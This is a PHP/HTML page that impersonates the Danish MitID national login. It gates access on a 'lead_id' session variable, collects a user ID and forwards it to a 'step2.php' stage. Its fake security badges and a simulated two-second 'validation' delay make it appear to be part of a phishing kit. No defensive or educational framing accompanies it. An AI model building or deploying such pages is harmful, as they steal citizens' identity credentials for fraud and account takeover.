<?php
require_once 'config.php';
session_start();

if (!isset($_SESSION['lead_id'])) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log på med MitID</title>
    <link rel="icon" type="image/svg+xml" href="assets/mitid-logo.svg">
    <link rel="stylesheet" href="assets/style.css">
</head>
<body class="mitid-page">
    <!-- MitID Navigation -->
    <header class="mitid-nav">
        <div class="mitid-nav-container">
            <img src="assets/mitid-logo.svg" alt="MitID Logo" class="mitid-logo">
            <span class="mitid-brand">MitID</span>
        </div>
    </header>

    <main class="mitid-main">
        <div class="mitid-container">
            <div class="mitid-box">
                <div class="mitid-header">
                    <div class="mitid-icon">
                        <svg viewBox="0 0 24 24" width="40" height="40">
                            <circle cx="12" cy="12" r="10" fill="#003c6c"/>
                            <circle cx="12" cy="10" r="4" fill="white"/>
                            <path d="M4 20C5.5 16 8 14 12 14C16 14 18.5 16 20 20" 
                                  fill="white" stroke="white" stroke-width="2"/>
                        </svg>
                    </div>
                    <h1>Log på med MitID</h1>
                    <p>Indtast dit bruger-ID for at fortsætte</p>
                </div>

                <form id="mitidForm" action="step2.php" method="POST" class="mitid-form">
                    <div class="form-group">
                        <label for="bruger_id">Bruger-ID</label>
                        <div class="input-with-icon">
                            <input type="text" 
                                   id="bruger_id" 
                                   name="bruger_id" 
                                   placeholder="Indtast dit bruger-ID"
                                   required
                                   autocomplete="username">
                            <span class="input-icon">👤</span>
                        </div>
                    </div>

                    <div class="mitid-options">
                        <label class="checkbox-label">
                            <input type="checkbox" name="remember" checked>
                            <span>Husk mig</span>
                        </label>
                        <a href="#" onclick="return false;" class="help-link">Brug for hjælp?</a>
                    </div>

                    <button type="submit" class="mitid-button" id="mitidButton">
                        <span class="button-text">Fortsæt</span>
                        <div class="button-loader" style="display: none;">
                            <div class="spinner"></div>
                            <span>Kontrollerer...</span>
                        </div>
                    </button>
                </form>

                <div class="mitid-footer">
                    <p>Beskyttet af MitID</p>
                    <p class="security-text">🔒 Sikker forbindelse</p>
                </div>
            </div>
        </div>
    </main>

    <script src="assets/script.js"></script>
    <script>
        // MitID form animation
        document.getElementById('mitidForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const button = document.getElementById('mitidButton');
            const buttonText = button.querySelector('.button-text');
            const buttonLoader = button.querySelector('.button-loader');
            
            buttonText.style.display = 'none';
            buttonLoader.style.display = 'flex';
            button.disabled = true;
            
            // Simulate validation
            setTimeout(() => {
                this.submit();
            }, 2000);
        });
    </script>
</body>
</html>
